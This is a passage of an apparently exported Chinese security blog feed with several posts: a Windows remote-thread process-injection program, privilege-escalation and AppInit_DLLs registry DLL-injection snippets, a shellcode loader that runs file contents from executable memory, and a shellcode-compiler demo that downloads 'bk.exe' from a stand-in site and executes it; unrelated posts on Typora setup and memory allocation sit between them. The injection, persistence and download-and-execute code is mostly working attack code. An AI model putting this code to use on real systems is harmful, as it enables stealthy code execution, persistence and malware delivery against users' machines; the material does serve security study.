int3                                     */    /* 07BD */ &quot;\xcc&quot;                                             /* int3                                     */    /* 07BE */ &quot;\xcc&quot;                                             /* int3                                     */    /* 07BF */ &quot;\xcc&quot;                                             /* int3                                     */};typedef struct _RemoteParam {    char szMsg[12];    //MessageBox函数中显示的字符提示      DWORD dwMessageBox;//MessageBox函数的入口地址  } RemoteParam, * PRemoteParam;typedef VOID(*pCreateRemoteThread64) (HANDLE hProcess,    LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,    LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,    DWORD dwCreationFlags, LPDWORD lpThreadId, LPHANDLE hThread);//定义MessageBox类型的函数指针typedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);DWORD __stdcall threadProc(LPVOID lParam){    RemoteParam* pRP = (RemoteParam*)lParam;    PFN_MESSAGEBOX pfnMessageBox;    pfnMessageBox = (PFN_MESSAGEBOX)pRP-&gt;dwMessageBox;    pfnMessageBox(NULL, pRP-&gt;szMsg, pRP-&gt;szMsg, 0);    return 0;}bool enableDebugPriv(){    HANDLE hToken;    LUID sedebugnameValue;    TOKEN_PRIVILEGES tkp;    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) {        return false;    }    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) {        CloseHandle(hToken);        return false;    }    tkp.PrivilegeCount = 1;    tkp.Privileges[0].Luid = sedebugnameValue;    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) {        CloseHandle(hToken);        return false;    }    return true;}HANDLE GetProcessHandleByName(LPCWSTR lpszProcessName){    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    PROCESSENTRY32 pe;    pe.dwSize = sizeof(PROCESSENTRY32);    if (!Process32First(hSnapshot, &amp;pe)) {        MessageBoxA(NULL,            &quot;The frist entry of the process list has not been copyied to the buffer&quot;,            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);        return 0;    }    while (Process32Next(hSnapshot, &amp;pe)) {        if (!lstrcmpW(lpszProcessName, pe.szExeFile)) {            return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);        }    }    return 0;}LPVOID init_func(char* asmcode, DWORD len){    LPVOID sc = NULL;    // allocate write/executable memory for code    sc = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    if (sc != NULL) {        // copy code        memcpy(sc, asmcode, len);    }    else {        MessageBoxA(NULL, &quot;VirtualAlloc()&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);    }    return sc;}int main(){    const DWORD dwThreadSize = 4096;    DWORD dwWriteBytes = 0;    enableDebugPriv();    HANDLE TargetProc = GetProcessHandleByName(L&quot;CCC.exe&quot;);//进程名称    if (!TargetProc)    {        MessageBoxA(NULL,            &quot;Open target process failed !&quot;,            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);        return 0;    }    BOOL ISWow64 = false;    IsWow64Process(TargetProc, &amp;ISWow64);    if (ISWow64)    {        cout &lt;&lt; &quot;32Bit Process &quot; &lt;&lt;endl;        //在宿主进程中为线程体开辟一块存储区域          //在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型          //其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。          void* pRemoteThread = VirtualAllocEx(TargetProc, 0,            dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);        if (!pRemoteThread) {            MessageBoxA(NULL, &quot;Alloc memory in target process failed !&quot;,                &quot;notice&quot;, MB_ICONINFORMATION | MB_OK);            return 0;        }        //将线程体拷贝到宿主进程中          if (!WriteProcessMemory(TargetProc,            pRemoteThread, &amp;threadProc, dwThreadSize, 0)) {            MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);            return 0;        }        cout &lt;&lt; &quot;pRemoteThread:&quot; &lt;&lt; hex &lt;&lt; pRemoteThread &lt;&lt; endl;        getchar();        //定义线程参数结构体变量          RemoteParam remoteData;        ZeroMemory(&amp;remoteData, sizeof(RemoteParam));        //填充结构体变量中的成员          HINSTANCE hUser32 = LoadLibrary(L&quot;User32.dll&quot;);        remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, &quot;MessageBoxA&quot;);        strcat_s(remoteData.szMsg, &quot;Hello＼0&quot;);        //为线程参数在宿主进程中开辟存储区域          RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(            TargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);        if (!pRemoteParam) {            MessageBoxA(NULL, &quot;Alloc memory failed !&quot;,                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);            return 0;        }        //将线程参数拷贝到宿主进程地址空间中          if (!WriteProcessMemory(TargetProc,            pRemoteParam, &amp;remoteData, sizeof(remoteData), 0)) {            MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);            return 0;        }        //在宿主进程中创建线程          HANDLE hRemoteThread = CreateRemoteThread(            TargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,            pRemoteParam, 0, &amp;dwWriteBytes);        if (!hRemoteThread) {            MessageBoxA(NULL, &quot;Create remote thread failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);            return 0;        }        CloseHandle(hRemoteThread);        FreeLibrary(hUser32);        return 0;    }    else    {        cout &lt;&lt; &quot;64Bit Process &quot; &lt;&lt; endl;        void* pRemoteThread = VirtualAllocEx(TargetProc, 0,            EXECPIC_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);        if (!pRemoteThread) {            MessageBoxA(NULL, &quot;Alloc memory in target process failed !&quot;,                &quot;notice&quot;, MB_ICONINFORMATION | MB_OK);            return 0;        }        if (!WriteProcessMemory(TargetProc, pRemoteThread, EXECPIC, EXECPIC_SIZE, 0))        {            MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);            return 0;        }        HANDLE hThread = NULL;        pCreateRemoteThread64 CreateRemoteThread64 = (pCreateRemoteThread64)init_func(CREATETHREADPIC, CREATETHREADPIC_SIZE);        CreateRemoteThread64(TargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, 0, 0, 0, &amp;hThread);        if (!hThread)        {            MessageBoxA(NULL, &quot;CreateRemoteThread64 target thread failed !&quot;,                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);            return 0;        }        WaitForSingleObject(hThread, INFINITE);    }    return 0;}</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>安全技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用代码</title>
    <link href="/cray/2020/03/18/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81/"/>
    <url>/cray/2020/03/18/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>[toc]</p><h3 id="Visual-Studio相关"><a href="#Visual-Studio相关" class="headerlink" title="Visual Studio相关"></a>Visual Studio相关</h3><h4 id="定义字符串常量的差别"><a href="#定义字符串常量的差别" class="headerlink" title="定义字符串常量的差别"></a>定义字符串常量的差别</h4><p>vs2019</p><pre><code class="c++">const WCHAR* Mes1 = L&quot;Hello world!&quot;;   //较为严格WCHAR Mes2[] = L&quot;Hello world!&quot;;WCHAR Mes3[] = { L&#39;A&#39;,L&#39;B&#39;,L&#39;R&#39;,L&#39;l&#39;,0};//注意是单引号char Mes4[] = {&#39;a&#39;,&#39;b&#39;,&#39;v&#39;};</code></pre><p>vs2013</p><pre><code class="c">WCHAR* Mes1 = L&quot;Hello world!&quot;;WCHAR Mes2[] = L&quot;Hello world!&quot;;WCHAR Mes3[] = { L&#39;A&#39;,L&#39;B&#39;,L&#39;R&#39;,L&#39;l&#39;,0};char Mes4[] = {&#39;a&#39;,&#39;b&#39;,&#39;v&#39;};</code></pre><h3 id="错误提示"><a href="#错误提示" class="headerlink" title="错误提示"></a>错误提示</h3><pre><code class="c++">#include &lt;windows.h&gt;#include &lt;strsafe.h&gt;void ErrorExit(const char* lpszFunction){    LPVOID lpMsgBuf;    char Mes[1024] = { 0, };    LPVOID lpDisplayBuf;    DWORD dw = GetLastError();    FormatMessageA(        FORMAT_MESSAGE_ALLOCATE_BUFFER |        FORMAT_MESSAGE_FROM_SYSTEM |        FORMAT_MESSAGE_IGNORE_INSERTS,        NULL,        dw,        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),        (LPSTR)&amp; lpMsgBuf,        0, NULL);    sprintf_s(Mes, &quot;%s failed with error 0x%x: %s&quot;, lpszFunction, dw, lpMsgBuf);    MessageBoxA(NULL, Mes, &quot;failed&quot;, MB_OK);    ExitProcess(dw);}void main(){    if (!GetProcessId(NULL))        ErrorExit(&quot;GetProcessId&quot;);}</code></pre><h3 id="宏定义相关"><a href="#宏定义相关" class="headerlink" title="宏定义相关"></a>宏定义相关</h3><h4 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h4><pre><code>typedef NTSTATUS (WINAPI* FN_NtQueryInformationThread)(    IN HANDLE               ThreadHandle,    IN THREAD_INFORMATION_CLASS ThreadInformationClass,    OUT PVOID               ThreadInformation,    IN ULONG                ThreadInformationLength,    OUT PULONG              ReturnLength OPTIONAL);typedef struct _THREAD_BASIC_INFORMATION{    NTSTATUS                ExitStatus;    PVOID                   TebBaseAddress;    int                        ClientId;    KAFFINITY               AffinityMask;    int                        Priority;    int                        BasePriority;    int                        v;} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;void Func(){    FN_NtQueryInformationThread NtQueryInformationThread =(FN_NtQueryInformationThread)GetProcAddress(LoadLibrary(L&quot;Ntdll.dll&quot;), &quot;NtQueryInformationThread&quot;);    NtQueryInformationThread(hOpenThread, (THREAD_INFORMATION_CLASS)0, &amp;threadBasicInfo, sizeof(threadBasicInfo), NULL);}</code></pre><h3 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h3><h4 id="令牌方式"><a href="#令牌方式" class="headerlink" title="令牌方式"></a>令牌方式</h4><pre><code class="c++">// 传入参数 SeDebugPrivilege，提升到调试权限BOOL GrantPriviledge(WCHAR* PriviledgeName){    TOKEN_PRIVILEGES TokenPrivileges, OldPrivileges;    DWORD             dwReturnLength = sizeof(OldPrivileges);    HANDLE             TokenHandle = NULL;    LUID             uID;    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &amp;TokenHandle))    {        if (GetLastError() != ERROR_NO_TOKEN)        {            return FALSE;        }        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;TokenHandle))        {            return FALSE;        }    }    if (!LookupPrivilegeValue(NULL, PriviledgeName, &amp;uID))        // 通过权限名称查找uID    {        CloseHandle(TokenHandle);        return FALSE;    }    TokenPrivileges.PrivilegeCount = 1;        // 要提升的权限个数    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    TokenPrivileges.Privileges[0].Luid = uID;    if (!AdjustTokenPrivileges(TokenHandle, FALSE, &amp;TokenPrivileges, sizeof(TOKEN_PRIVILEGES), &amp;OldPrivileges, &amp;dwReturnLength))    {        CloseHandle(TokenHandle);        return FALSE;    }    CloseHandle(TokenHandle);    cout&lt;&lt; &quot;[+] AdjustTokenPrivileges to SeDebugPrivilege Success!&quot; &lt;&lt; endl;    return TRUE;}</code></pre><h4 id="RtlAdjustPrivilege"><a href="#RtlAdjustPrivilege" class="headerlink" title="RtlAdjustPrivilege"></a>RtlAdjustPrivilege</h4><pre><code class="c++">// 传入参数 SE_DEBUG_PRIVILEGE，提升到调试权限#define SE_DEBUG_PRIVILEGE                (20L)typedefNTSTATUS(NTAPI * pfnRtlAdjustPrivilege)(    UINT32 Privilege,    BOOLEAN Enable,    BOOLEAN Client,    PBOOLEAN WasEnabled);BOOL GrantPriviledge(IN UINT32 Priviledge){    pfnRtlAdjustPrivilege    RtlAdjustPrivilege = NULL;    BOOLEAN                    WasEnable = FALSE;    RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;RtlAdjustPrivilege&quot;);    if (RtlAdjustPrivilege == NULL)    {        return FALSE;    }    RtlAdjustPrivilege(Priviledge, TRUE, FALSE, &amp;WasEnable);    return TRUE;}RtlAdjustPrivilege</code></pre><h3 id="进程线程镜像"><a href="#进程线程镜像" class="headerlink" title="进程线程镜像"></a>进程线程镜像</h3><pre><code class="c++">// 使用ToolHelp系列函数#include &lt;TlHelp32.h&gt;BOOL GetProcessIdByProcessImageName(IN PWCHAR wzProcessImageName, OUT PUINT32 ProcessId){    HANDLE            ProcessSnapshotHandle = INVALID_HANDLE_VALUE;    PROCESSENTRY32    ProcessEntry32 = { 0 };    ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);        // 初始化PROCESSENTRY32结构    ProcessSnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    // 给系统所有的进程快照    if (ProcessSnapshotHandle == INVALID_HANDLE_VALUE)    {        return FALSE;    }    if (Process32First(ProcessSnapshotHandle, &amp;ProcessEntry32))        // 找到第一个    {        do        {            if (lstrcmpi(ProcessEntry32.szExeFile, wzProcessImageName) == 0)        // 不区分大小写            {                *ProcessId = ProcessEntry32.th32ProcessID;                break;            }        } while (Process32Next(ProcessSnapshotHandle, &amp;ProcessEntry32));    }    CloseHandle(ProcessSnapshotHandle);    ProcessSnapshotHandle = INVALID_HANDLE_VALUE;    if (*ProcessId == 0)    {        return FALSE;    }    return TRUE;}</code></pre><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><pre><code class="c++">int main(){    LSTATUS Status = 0;#ifdef _WIN64    　　　　WCHAR*    wzSubKey = L&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot;;#else    　　　　WCHAR*    wzSubKey = L&quot;SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot;;#endif // _WIN64    HKEY    hKey = NULL;    // 打开注册表    Status = RegOpenKeyExW(HKEY_LOCAL_MACHINE,        // 要打开的主键        wzSubKey,            // 要打开的子键名字地址        0,                    // 保留，传0        KEY_ALL_ACCESS,        // 打开的方式        &amp;hKey);                // 返回的子键句柄    if (Status != ERROR_SUCCESS)    {        return 0;    }    WCHAR*    wzValueName = L&quot;AppInit_DLLs&quot;;    DWORD    dwValueType = 0;    UINT8    ValueData[MAX_PATH] = { 0 };    DWORD    dwReturnLength = 0;    // 查询注册表    Status = RegQueryValueExW(hKey,        // 子键句柄        wzValueName,        // 待查询键值的名称        NULL,                // 保留        &amp;dwValueType,        // 数据类型        ValueData,            // 键值        &amp;dwReturnLength);    WCHAR    wzDllFullPath[MAX_PATH] = { 0 };    GetCurrentDirectoryW(MAX_PATH, wzDllFullPath);#ifdef _WIN64    wcscat_s(wzDllFullPath, L&quot;\\x64NormalDll.dll&quot;);#else    wcscat_s(wzDllFullPath, L&quot;\\x86NormalDll.dll&quot;);#endif    // 设置键值    Status = RegSetValueExW(hKey,        wzValueName,        NULL,        dwValueType,        (CONST BYTE*)wzDllFullPath,        (lstrlen(wzDllFullPath) + 1) * sizeof(WCHAR));    if (Status != ERROR_SUCCESS)    {        return 0;    }    wzValueName = L&quot;LoadAppInit_DLLs&quot;;    DWORD    dwLoadAppInit = 1;    // 查询注册表    Status = RegQueryValueExW(hKey, wzValueName, NULL, &amp;dwValueType, ValueData, &amp;dwReturnLength);    // 设置键值    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)&amp;dwLoadAppInit, sizeof(DWORD));    if (Status != ERROR_SUCCESS)    {        return 0;    }    printf(&quot;Input Any Key To Resume\r\n&quot;);    getchar();    getchar();    // 恢复键值    dwLoadAppInit = 0;    Status = RegQueryValueExW(hKey, wzValueName, NULL, &amp;dwValueType, ValueData, &amp;dwReturnLength);    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)&amp;dwLoadAppInit, sizeof(DWORD));    wzValueName = L&quot;AppInit_DLLs&quot;;    ZeroMemory(wzDllFullPath, (lstrlen(wzDllFullPath) + 1) * sizeof(WCHAR));    Status = RegQueryValueExW(hKey, wzValueName, NULL, &amp;dwValueType, ValueData, &amp;dwReturnLength);    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)wzDllFullPath, 0);    return 0;}</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>写作环境Typora+picgo+gitee</title>
    <link href="/cray/2020/03/18/%E5%86%99%E4%BD%9C%E7%8E%AF%E5%A2%83Typora+picgo+gitee/"/>
    <url>/cray/2020/03/18/%E5%86%99%E4%BD%9C%E7%8E%AF%E5%A2%83Typora+picgo+gitee/</url>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>​        日常有笔记，但是都不是很好用（vscode 界面不太喜欢）所以选用typora，但是这个软件的图片上传有点麻烦，官方在0.9.86才支持图片上传，但是都是搭配picgo，原来都是github+picgo，问题多，经常抽风，上传不了。</p><p>​        狠下心改用国内的码云，上传速度快，国内加载也快。</p><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>有人踩过坑，我们就学习就好了</p><p><a href="https://zhuanlan.zhihu.com/p/102594554" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/102594554</a></p><p>基本跟着安装就行。</p><h4 id="几个重要步骤"><a href="#几个重要步骤" class="headerlink" title="几个重要步骤"></a>几个重要步骤</h4><p>插件使用</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205814205.png" srcset="/cray/img/loading.gif" alt="image-20200317205814205"></p><p>Gitee配置如下</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205847316.png" srcset="/cray/img/loading.gif" alt="image-20200317205847316"></p><p>代理位置一定要用<strong>36677</strong>端口</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205939770.png" srcset="/cray/img/loading.gif" alt="image-20200317205939770"></p><p><strong>typora配置</strong></p><p>我这里选用exe，core不会配置。。。</p><p><strong>注意 typora默认使用36677端口和picgo通信，注意36677端口是否是picgo在用</strong></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317210018170.png" srcset="/cray/img/loading.gif" alt="image-20200317210018170"></p>]]></content>
    
    
    
    <tags>
      
      <tag>开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>申请内存</title>
    <link href="/cray/2020/03/18/%E7%94%B3%E8%AF%B7%E5%86%85%E5%AD%98%E5%B8%B8%E8%A7%81/"/>
    <url>/cray/2020/03/18/%E7%94%B3%E8%AF%B7%E5%86%85%E5%AD%98%E5%B8%B8%E8%A7%81/</url>
    
    <content type="html"><![CDATA[<h3 id="三种内存分配例子使用"><a href="#三种内存分配例子使用" class="headerlink" title="三种内存分配例子使用"></a>三种内存分配例子使用</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p><strong>C运行库中的动态内存分配函数</strong>，用的较少，在C中常见</p><p>申请堆中的空间使用，释放使用<strong>free</strong></p><p>exp：</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;malloc.h&gt;int main(void){    char* string;    string = malloc(1024);    if (string == NULL)        printf(&quot;Insufficient memory available\n&quot;);    else    {        printf(&quot;Memory space allocated for path name\n&quot;);        free(string);        printf(&quot;Memory freed\n&quot;);    }}</code></pre><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p>平常中申请动态内存时用的API</p><pre><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main(){    char* p = NULL;    char s[] = &quot;Hello world!&quot;;    p = new char[1024];    if (!p)    {        printf(&quot;Mem Alloc Failed!\n&quot;);        return 0;    }    ZeroMemory(p, 1024);    memcpy(p, s, strlen(s));    printf(&quot;Mem Info -&gt; %s \n&quot;, p);    delete[] p;    p = NULL;    return 0;}</code></pre><h3 id="virtualAlloc和virtualAllocEx"><a href="#virtualAlloc和virtualAllocEx" class="headerlink" title="virtualAlloc和virtualAllocEx"></a>virtualAlloc和virtualAllocEx</h3><p>virtualAlloc 申请自己的内存</p><p>virtualAllocEx 可以指定进程申请</p><p>这个比较常用有特殊需求的内存时，比如要申请可以执行内存</p><pre><code class="c++">    HANDLE hProcess = NULL;    LPVOID p =  VirtualAllocEx(hProcess, NULL,1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    VirtualFreeEx(hProcess, p, 1024, MEM_RELEASE | MEM_DECOMMIT);</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Inter 自动化shellcode</title>
    <link href="/cray/2020/03/18/%E8%87%AA%E5%8A%A8%E5%8C%96ShellCode/"/>
    <url>/cray/2020/03/18/%E8%87%AA%E5%8A%A8%E5%8C%96ShellCode/</url>
    
    <content type="html"><![CDATA[<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>学习来源<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E7%9A%84%E6%8F%90%E5%8F%96%E4%B8%8E%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">3gstudent</a></p><p>总结<code>3gstudent</code>的两篇文章</p><blockquote><p>小知识</p></blockquote><table><thead><tr><th align="center">类型</th><th align="center">32位大小</th><th align="center">64位大小</th></tr></thead><tbody><tr><td align="center">char</td><td align="center">1个字节</td><td align="center">1个字节</td></tr><tr><td align="center">char*（即指针变量）</td><td align="center">4个字节</td><td align="center">8个字节</td></tr><tr><td align="center">short int</td><td align="center">2个字节</td><td align="center">2个字节</td></tr><tr><td align="center">int</td><td align="center">4个字节</td><td align="center">4个字节</td></tr><tr><td align="center">unsigned int</td><td align="center">4个字节</td><td align="center">4个字节</td></tr><tr><td align="center">float</td><td align="center">4个字节</td><td align="center">4个字节</td></tr><tr><td align="center">double</td><td align="center">8个字节</td><td align="center">8个字节</td></tr><tr><td align="center">long</td><td align="center">4个字节</td><td align="center">8个字节</td></tr><tr><td align="center">long long</td><td align="center">8个字节</td><td align="center">8个字节</td></tr><tr><td align="center">unsigned long</td><td align="center">4个字节</td><td align="center">8个字节</td></tr></tbody></table><h2 id="shellcode-生成的三种方法"><a href="#shellcode-生成的三种方法" class="headerlink" title="shellcode 生成的三种方法"></a>shellcode 生成的三种方法</h2><h3 id="1-手工"><a href="#1-手工" class="headerlink" title="1.手工"></a>1.手工</h3><p>可以先利用vs生成exe，运行时去拿汇编出来，这种方式和手写汇编差不多，需要构造各种变量，不推荐使用</p><h3 id="2-使用自动化工具"><a href="#2-使用自动化工具" class="headerlink" title="2.使用自动化工具"></a>2.使用自动化工具</h3><p><a href="https://github.com/NytroRST/ShellcodeCompiler" target="_blank" rel="noopener">shellcode compiler</a><br>使用的时候下载release程序，生成shellcode就能用。目前已经支持平台</p><blockquote><p>Windows (x86 and x64) and Linux (x86 and x64)</p></blockquote><p>使用方法：给了很多例子，这里说明一个Demo</p><pre><code class="c++">    function URLDownloadToFileA(&quot;urlmon.dll&quot;);         //等于GetProcAddress(LoadLibraryA(&quot;urlmon.dll&quot;), &quot;URLDownloadToFileA&quot;);    function WinExec(&quot;kernel32.dll&quot;);    function ExitProcess(&quot;kernel32.dll&quot;);    URLDownloadToFileA(0,&quot;https://site.com/bk.exe&quot;,&quot;bk.exe&quot;,0,0);    // 直接调用api即可    WinExec(&quot;bk.exe&quot;,0);    ExitProcess(0);</code></pre><p>将上面的保存为sourse.txt，然后生成shellcode即可</p><p>命令详见github</p><p>生成的shellcode 加-t命令可以测试，也可以自己写代码加载到内存中测试</p><p>下面时我的测试代码</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;windows.h&gt;using namespace std;size_t GetSize(LPSTR szFilePath){    size_t Size_File = 0;    FILE* fp;    fopen_s(&amp;fp, szFilePath, &quot;rb&quot;);    fseek(fp, 0, SEEK_END);    Size_File = ftell(fp);    rewind(fp);    fclose(fp);    return Size_File;}int main(){    char File_path[MAX_PATH] = { 0, };#ifdef _WIN64    cout &lt;&lt; &quot;Input 64bit Shellcode:&quot;;#else    cout &lt;&lt; &quot;Input 32bit Shellcode:&quot;;#endif    cin &gt;&gt; File_path;    if (*File_path == NULL){return -1;}    LPVOID lpBuffer = NULL;    size_t Shellcode_Size = GetSize(File_path);    lpBuffer = VirtualAlloc(0, Shellcode_Size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);    if (!lpBuffer){return -1;}    FILE *fp;    fopen_s(&amp;fp, File_path, &quot;rb&quot;);    fread_s(lpBuffer, Shellcode_Size, 1, Shellcode_Size, fp);    fclose(fp);    (*(int(*)())lpBuffer)();//调用该函数    VirtualFree(lpBuffer, Shellcode_Size, MEM_DECOMMIT);    return 0;}</code></pre><h3 id="3-使用Visual-Studio生成Shellcode"><a href="#3-使用Visual-Studio生成Shellcode" class="headerlink" title="3.使用Visual Studio生成Shellcode"></a>3.使用Visual Studio生成Shellcode</h3><p> <strong>环境</strong></p><p>Visual Studio 2019（其他本版都行）</p><ul><li>使用release生成</li><li>禁用优化</li><li>禁用安全检测（/GS-）</li></ul><p>核心思路，不要使用全局变量，常见的字符串操作都自己写函数</p><p>代码参考3gstudent</p><pre><code class="c++">#include &lt;windows.h&gt;#include &lt;Winternl.h&gt;#include &lt;stdio.h&gt;#pragma optimize( &quot;&quot;, off ) void shell_code();HANDLE GetKernel32Handle();BOOL __ISUPPER__(__in CHAR c);CHAR __TOLOWER__(__in CHAR c);UINT __STRLEN__(__in LPSTR lpStr1);UINT __STRLENW__(__in LPWSTR lpStr1);LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2);INT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2);INT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen);LPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount);UINT __CalcHash__(__in LPVOID lpStr);typedef FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR);typedef HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR);typedef ULONG(WINAPI* MESSAGEBOXAPI)(HWND, LPCSTR, LPWSTR, ULONG);void shell_code() {    LoadLibraryWAPI    loadlibrarywapi = 0;    GetProcAddressAPI getprocaddressapi = 0;    MESSAGEBOXAPI messageboxapi = 0;    wchar_t struser32[] = { L&#39;u&#39;, L&#39;s&#39;, L&#39;e&#39;, L&#39;r&#39;, L&#39;3&#39;,L&#39;2&#39;, L&#39;.&#39;, L&#39;d&#39;, L&#39;l&#39;, L&#39;l&#39;, 0 };    char MeassageboxA_api[] = { &#39;M&#39;, &#39;e&#39;, &#39;s&#39;, &#39;s&#39;, &#39;a&#39;, &#39;g&#39;, &#39;e&#39;, &#39;B&#39;, &#39;o&#39;, &#39;x&#39;, &#39;A&#39;, 0 };    char MeassageText[] = { &#39;H&#39;,&#39;e&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39;,&#39;.&#39;,&#39;W&#39;,&#39;o&#39;,&#39;l&#39;,&#39;r&#39;,&#39;d&#39;,&#39;!&#39;,0 };    HANDLE hKernel32 = GetKernel32Handle();    if (hKernel32 == INVALID_HANDLE_VALUE) {        return;    }    LPBYTE lpBaseAddr = (LPBYTE)hKernel32;    PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr-&gt;e_lfanew);    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);    LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNames);    LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfFunctions);    LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNameOrdinals);    //CHAR strLoadLibraryA[] = { &#39;L&#39;, &#39;o&#39;, &#39;a&#39;, &#39;d&#39;, &#39;L&#39;, &#39;i&#39;, &#39;b&#39;, &#39;r&#39;, &#39;a&#39;, &#39;r&#39;, &#39;y&#39;, &#39;W&#39;, 0x0 };    //CHAR strGetProcAddress[] = { &#39;G&#39;, &#39;e&#39;, &#39;t&#39;, &#39;P&#39;, &#39;r&#39;, &#39;o&#39;, &#39;c&#39;, &#39;A&#39;, &#39;d&#39;, &#39;d&#39;, &#39;r&#39;, &#39;e&#39;, &#39;s&#39;, &#39;s&#39;, 0x0 };    UINT HashrLoadLibraryA = 0x6fffef88;    